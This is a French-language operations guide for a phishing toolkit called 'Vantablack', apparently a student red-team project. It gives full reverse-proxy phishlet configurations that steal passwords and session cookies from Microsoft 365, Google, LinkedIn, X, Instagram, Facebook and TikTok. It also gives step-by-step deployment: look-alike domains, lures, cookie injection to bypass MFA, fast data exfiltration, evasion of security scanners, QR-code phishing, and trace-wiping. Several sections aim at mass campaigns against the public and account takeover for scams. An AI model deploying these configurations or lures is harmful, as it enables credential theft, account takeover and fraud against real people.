# VANTABLACK v4.0 - Templates et Instructions Red Team

Ce document fournit les ressources nécessaires pour la mission Red Team : les templates pour les réseaux réels et les instructions opérationnelles contre les plateformes cibles.

## 1. Templates pour Réseaux Réels

Les templates pour les réseaux réels dans Vantablack sont principalement implémentés sous forme de "Phishlets" (fichiers YAML de configuration pour le proxy inverse) et de templates HTML dynamiques.

### A. Phishlets (Configuration Proxy)

Voici les configurations optimisées pour les trois cibles principales : Microsoft O365, Google et LinkedIn. Ces fichiers doivent être placés dans le dossier `phishlets/`.

#### 1. Microsoft Office 365 (`phishlets/o365.yaml`)

Ce template est conçu pour contourner l'authentification moderne et capturer les tokens de session (ESTSAUTH, SignInStateCookie).

```yaml
# PHISHLET FINAL : MICROSOFT O365 (VANTABLACK SECURED)
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login.microsoftonline.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript', 'application/json']}

auth_tokens:
  - domain: '.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
  - domain: '.office.com'
    keys: ['SessionToken', 'Office_SessId']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/'
```

#### 2. Google / Gmail (`phishlets/google.yaml`)

Template optimisé pour les comptes Google Workspace et personnels.

```yaml
# VANTABLACK PROJECT | ETHICAL DISCLAIMER: USAGE AUTORISÉ UNIQUEMENT
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false}

sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com/SignOutOptions', replace: 'https://{hostname}/SignOutOptions', mimes: ['text/html', 'application/javascript']}

auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'HSID', 'SAPISID', 'SSID', 'APISID', 'LSID']
  - domain: 'accounts.google.com'
    keys: ['GAPS', 'LSID', 'ACCOUNT_CHOOSER']

credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'accounts.google.com'
  path: '/ServiceLogin'
```

#### 3. LinkedIn (`phishlets/linkedin.yaml`)

Utilisé pour la reconnaissance et l'ingénierie sociale ciblée.

```yaml
# PHISHLET FINAL : LINKEDIN (VANTABLACK SECURED)
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'licdn.com', session: false}

sub_filters:
  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'https://www.linkedin.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}

auth_tokens:
  - domain: '.linkedin.com'
    keys: ['li_at', 'JSESSIONID', 'bscookie', 'sl']

credentials:
  username:
    key: 'session_key'
    search: '(.*)'
    type: 'post'
  password:
    key: 'session_password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.linkedin.com'
  path: '/checkpoint/lg/login'
```

#### 4. X / Twitter (`phishlets/twitter.yaml`)

Cible les identifiants et tokens d'authentification de la plateforme X.

```yaml
# PHISHLET FINAL : X / TWITTER (VANTABLACK SECURED)
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'x.com', session: true, is_landing: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'x.com', session: true, is_landing: false}

sub_filters:
  - {triggers_on: 'www.x.com', orig_sub: 'www', domain: 'x.com', search: 'https://x.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
  - {triggers_on: 'www.x.com', orig_sub: 'www', domain: 'x.com', search: 'https://twitter.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}

auth_tokens:
  - domain: '.x.com'
    keys: ['auth_token', 'ct0', 'twid', 'personalization_id']
  - domain: '.twitter.com'
    keys: ['auth_token', 'ct0']

credentials:
  username:
    key: 'text'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.x.com'
  path: '/i/flow/login'
```

#### 5. Instagram (`phishlets/instagram.yaml`)

Pour la récupération de comptes via mobile ou web.

```yaml
# PHISHLET FINAL : INSTAGRAM (VANTABLACK SECURED)
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
  - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: true}

sub_filters:
  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://www.instagram.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript', 'application/json']}

auth_tokens:
  - domain: '.instagram.com'
    keys: ['sessionid', 'ds_user_id', 'csrftoken']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'enc_password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.instagram.com'
  path: '/accounts/login/'
```

#### 6. Facebook (`phishlets/facebook.yaml`)

**CIBLE :** Grand Public & Gestionnaires de Pages.
Le réseau social le plus utilisé au monde, idéal pour des campagnes de masse.

```yaml
# PHISHLET FINAL : FACEBOOK (VANTABLACK SOCIAL POWER)
# CIBLE : GRAND PUBLIC & GESTIONNAIRES DE PAGES
# OPTIMISÉ POUR MOBILE (M.FACEBOOK.COM)
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false}

sub_filters:
  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://www.facebook.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://m.facebook.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}

auth_tokens:
  - domain: '.facebook.com'
    keys: ['c_user', 'xs', 'fr', 'datr']

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'pass'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.facebook.com'
  path: '/login.php'
```

#### 7. TikTok (`phishlets/tiktok.yaml`)

**CIBLE :** Gen Z & Influenceurs.
Vecteur d'attaque viral, très efficace pour cibler les comptes à forte visibilité.

```yaml
# PHISHLET FINAL : TIKTOK (VANTABLACK VIRAL)
# CIBLE : INFLUENCEURS & JEUNESSE (GEN Z)
# ATTENTION : PROTECTION ANTIBOT TRES ELEVEE SUR TIKTOK
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'tiktok.com', session: true, is_landing: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'tiktok.com', session: true, is_landing: false}

sub_filters:
  - {triggers_on: 'www.tiktok.com', orig_sub: 'www', domain: 'tiktok.com', search: 'https://www.tiktok.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript', 'application/json']}

auth_tokens:
  - domain: '.tiktok.com'
    keys: ['session_id', 'tt_webid', 'tt_webid_v2', 'csrf_session_id']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.tiktok.com'
  path: '/login'
```

### B. Générateur de Templates HTML Dynamiques

Pour les landing pages personnalisées, utilisez le générateur Python situé dans `templates/generator.py`.

**Exemple d'utilisation :**

```python
from templates.generator import TemplateGenerator, TemplateConfig

# Configuration pour une page de login O365 personnalisée
config = TemplateConfig(
    target_platform="o365",
    template_type="login",
    personalization_level="high",
    responsive=True,
    optimization_level="maximum",
    compliance_checks=["gdpr"],
    custom_variables={"company_name": "Target Corp"}
)

generator = TemplateGenerator()
template = generator.generate(config)

print(f"Template généré : {template.name}")
# Le code HTML est disponible dans template.html_content
```

### C. GOD MODE : Portail Universel Multi-Réseaux

Le **God Mode** est une innovation de Vantablack v4.0 permettant de cibler simultanément plusieurs réseaux sociaux via un portail de "Vérification de Sécurité" unifié.

**Fichier :** `templates/godmode_portal.html`
**Script de lancement :** `godmode.py`

**Avantages Stratégiques :**
1.  **Choix de la Victime** : L'utilisateur choisit lui-même le réseau avec lequel il est le plus à l'aise, augmentant le taux de conversion.
2.  **Crédibilité** : Apparence d'un portail OAuth légitime (type "Sign in with...").
3.  **Centralisation** : Une seule campagne pour capturer des identifiants Facebook, Instagram, Twitter, TikTok et Google.

---

## 2. Instructions Contre des Plateformes

Cette section détaille la méthodologie opérationnelle pour déployer les attaques contre les plateformes ciblées.

### Stratégie Générale

1.  **Infrastructure** :
    *   Utiliser un VPS avec une IP propre (non blacklistée).
    *   Configurer les enregistrements DNS (A, NS) pour pointer vers le serveur Vantablack.
    *   Ports requis : 80 (HTTP), 443 (HTTPS), 53 (DNS si utilisé).

2.  **Nom de Domaine** :
    *   Choisir un domaine plausible (Typosquatting ou Look-alike).
    *   Exemple pour `microsoft.com` -> `micros0ft-support.com` ou `login-security-update.com`.

### Instructions Spécifiques par Plateforme

#### A. Microsoft Office 365 (Cible Prioritaire)

**Vecteur d'attaque :** Phishing d'identifiants + Bypass MFA (SMS/App).

**Procédure :**

1.  **Configuration du Phishlet :**
    *   Assurez-vous que le fichier `phishlets/o365.yaml` est chargé.
    *   Configurez le domaine de phishing :
        ```bash
        config domain <votre-domaine.com>
        phishlet hostname o365 <votre-domaine.com>
        ```

2.  **Lancement :**
    *   Activez le phishlet : `phishlet enable o365`
    *   Générez les certificats SSL (automatique via Let's Encrypt).

3.  **Création du Lure (Appât) :**
    *   Créez une URL spécifique pour la cible :
        ```bash
        lures create o365
        lures get-url <id>
        ```
    *   Envoyez cette URL via un email de prétexte (ex: "Mise à jour de sécurité requise").

4.  **Post-Exploitation :**
    *   Une fois la victime connectée, Vantablack capture le cookie de session.
    *   Récupérez le cookie via la commande `sessions`.
    *   Injectez le cookie dans votre navigateur (via extension EditThisCookie) pour accéder au compte sans MFA.

#### B. Google Workspace

**Vecteur d'attaque :** Accès aux emails et documents confidentiels.

**Procédure :**

1.  **Configuration :**
    *   Utilisez le phishlet `google`.
    *   Configurez le hostname : `phishlet hostname google <votre-domaine.com>`

2.  **Point Critique :**
    *   Google a des protections avancées contre les navigateurs automatisés. Vantablack utilise des techniques d'évasion (User-Agent rotation, TLS fingerprinting) pour simuler un navigateur légitime.
    *   Si la victime utilise une clé de sécurité physique (U2F/FIDO2), l'attaque échouera (limitation connue du proxying).

3.  **Exfiltration :**
    *   Une fois la session capturée, privilégiez l'accès rapide à Gmail et Drive pour exfiltrer les données sensibles avant que la session ne soit révoquée.

#### C. LinkedIn

**Vecteur d'attaque :** Reconnaissance et Pivot.

**Procédure :**

1.  **Usage :**
    *   Souvent utilisé comme première étape pour identifier les employés clés (RH, IT, Finance).
    *   Le leurre peut être une fausse offre d'emploi ou une connexion d'un "recruteur".

2.  **Configuration :**
    *   `phishlet hostname linkedin <votre-domaine.com>`
    *   `phishlet enable linkedin`

3.  **Attention :**
    *   LinkedIn détecte souvent les connexions depuis des IP inhabituelles. Utilisez un proxy résidentiel si possible pour l'accès post-exploitation.

#### D. X / Twitter

**Vecteur d'attaque :** Prise de contrôle de compte (Account Takeover) pour diffusion de désinformation ou crypto-scams.

**Procédure :**

1.  **Configuration :**
    *   `phishlet hostname twitter <votre-domaine.com>`
    *   Note : Le phishlet gère automatiquement la redirection entre `x.com` et `twitter.com`.

2.  **Lure :**
    *   Les faux avertissements de suspension ("Votre compte a été signalé pour activité suspecte") sont très efficaces sur cette plateforme.

3.  **MFA :**
    *   Le phishlet capture le code 2FA si activé par l'utilisateur. Soyez prêt à utiliser la session immédiatement.

#### E. Instagram

**Vecteur d'attaque :** Ingénierie sociale via DM (Direct Messages) ou faux support "Badge Bleu".

**Procédure :**

1.  **Configuration :**
    *   `phishlet hostname instagram <votre-domaine.com>`

2.  **Mobile First :**
    *   Assurez-vous que votre template de landing page est parfaitement optimisé pour mobile, car 90% des cibles ouvriront le lien sur leur téléphone.
    *   Utilisez le générateur de templates avec `responsive=True`.

3.  **Post-Exploitation :**
    *   L'accès aux DMs est la priorité pour pivoter vers d'autres cibles (amis proches).

#### F. Facebook (Social Engineering de Masse)

**Vecteur d'attaque :** Phishing de masse et récupération de pages Business.

**Procédure :**
1.  **Configuration :**
    *   `phishlet hostname facebook <votre-domaine.com>`
    *   Le template supporte `m.facebook.com` pour cibler spécifiquement les utilisateurs mobiles.

2.  **Lure (Appât) :**
    *   "C'est toi dans cette vidéo ?" (Classique mais efficace).
    *   Faux avertissement de violation de droits d'auteur pour les pages Business.

3.  **Performance :**
    *   Ce template est optimisé pour charger en moins de 1s sur réseau 4G.

#### G. TikTok (Cible Virale)

**Vecteur d'attaque :** Vol de comptes certifiés et manipulation d'audience.

**Procédure :**
1.  **Configuration :**
    *   `phishlet hostname tiktok <votre-domaine.com>`

2.  **Psychologie :**
    *   Ciblez l'ego : "Proposition de partenariat rémunéré" ou "Vérification de compte (Badge Bleu)".
    *   L'urgence est clé : "Répondez sous 24h pour confirmer votre éligibilité".

### 3. Psychologie de l'Ingénierie Sociale (Performance & Impact)

L'efficacité d'une campagne Red Team repose à 80% sur le scénario (le prétexte) et à 20% sur la technique. Voici comment maximiser l'impact psychologique :

#### A. Les 6 Principes de Persuasion (Cialdini) Appliqués
1.  **Urgence & Rareté (FOMO)** : Créez une fenêtre d'action courte.
    *   *Exemple :* "Votre mot de passe a expiré. Vous avez 24h pour le renouveler avant verrouillage définitif."
    *   *Technique Vantablack :* Utilisez des compteurs à rebours dans les templates HTML.
2.  **Autorité** : Imitez les figures de pouvoir (Support IT, RH, Gouvernement).
    *   *Exemple :* "Convocation RH - Présence obligatoire."
    *   *Technique :* Utilisez le template "God Mode" qui simule une vérification de sécurité officielle.
3.  **Preuve Sociale** : "Tout le monde le fait".
    *   *Exemple :* "Rejoignez vos 50 collègues sur le nouveau portail avantages."
4.  **Curiosité & Mystère** : Le levier le plus puissant pour le grand public.
    *   *Exemple :* "On parle de toi dans ce groupe privé..." (Lien vers Facebook Phishlet).

#### B. Optimisation de la Performance Technique
Pour que la psychologie fonctionne, la technique doit suivre :
*   **Vitesse de Chargement (Speed Index)** : Vantablack optimise les assets (minification CSS/JS) pour que la page s'affiche en < 1s, même en 3G. Une page lente = suspicion immédiate.
*   **Certificats SSL/TLS** : Indispensable. Le cadenas vert rassure inconsciemment la victime. Vantablack gère cela automatiquement via Let's Encrypt.
*   **Délivrabilité Email** : Soignez vos headers SPF/DKIM pour éviter le dossier SPAM.

### 4. Mesures de Contre-Détection (OPSEC)

*   **Filtrage des Bots :** Vantablack bloque automatiquement les scanners de sécurité connus.
*   **Durée de Vie :** Ne gardez pas une campagne active plus de 48h sur le même domaine.
*   **Redirection :** Configurez une URL de redirection (`redirect_url`) vers le site légitime pour que la victime ne se doute de rien après la connexion.

---

## 5. Fonctionnalités "Lunaires" (Ultra-Avancées)

Pour impressionner le jury, utilisez ces outils conçus pour l'effet "Wow" lors de la démonstration.

### A. WAR ROOM (Dashboard Cyberpunk)
Un tableau de bord animé en temps réel, style "Matrix/Mr Robot", pour visualiser les attaques sur une carte du monde.
*   **Lancement :** `python3 vanta.py --war-room`
*   **Effet :** Affiche les logs en vert sur fond noir, une carte du monde avec les "infections" qui clignotent, et des graphiques de succès. C'est purement visuel mais extrêmement impactant pour une soutenance.

### B. QUISHING (QR Code Phishing)
Attaquez les utilisateurs mobiles en contournant les filtres email classiques via des QR Codes malveillants.
*   **Usage :** Génère un QR Code contenant l'URL de votre phishlet, avec un logo incrusté pour la crédibilité.
*   **Commande Simplifiée :**
    ```bash
    # Générer un QR Code pour n'importe quelle URL (Facebook, O365, etc.)
    python3 vanta.py --quishing "https://votre-phishlet.com"
    ```
*   **Scénario :** Imprimez ce QR Code sur une fausse affiche "Connexion Wi-Fi Gratuite" ou "Sondage RH Obligatoire" pour votre démo physique.

### D. RAPPORT D'AUDIT AUTOMATIQUE (Le "Toucher Professionnel")
Transformez vos attaques en un rapport PDF/HTML digne d'un consultant Big 4.
*   **Commande :**
    ```bash
    python3 vanta.py --report
    ```
*   **Résultat :** Génère `AUDIT_REPORT_FINAL.html` avec graphiques, stats et recommandations de sécurité.

### E. MODE "DÉMO LÉGENDAIRE" (Pour le Jury)
Lancez une séquence scriptée qui montre TOUT le potentiel de l'outil en 10 secondes.
*   **Commande :**
    ```bash
    python3 vanta.py --demo
    ```
*   **Action :** 
    1.  Ouvre la War Room.
    2.  Simule une attaque massive en temps réel.
    3.  Génère et ouvre le rapport d'audit final.
    *C'est le bouton "Je valide mon année".*

### F. GHOST PROTOCOL (Nettoyage d'Urgence)
En cas de compromission ou fin de mission, supprimez toutes les traces instantanément.
*   **Commande :**
    ```bash
    python3 vanta.py --ghost
    ```
*   **Action :** Supprime irréversiblement les dossiers `sessions/`, `logs/` et l'historique terminal. Une confirmation "DELETE" est requise.

---

## 4. BRANCHES À SUPPRIMER (CLEANUP)
Après la soutenance, exécutez le **Ghost Protocol** puis supprimez ces branches Git pour ne laisser aucune trace du code offensif :

1.  `feature/social-networks` (Les phishlets de base)
2.  `feature/social-engineering-power` (Les templates psychologiques)
3.  `feature/social-godmode` (Le portail universel)
4.  `feature/lunar-tools` (War Room, Quishing, Ghost)
5.  `feature/legendary-status` (Mode Démo & Reporting - **Celle-ci**)

---
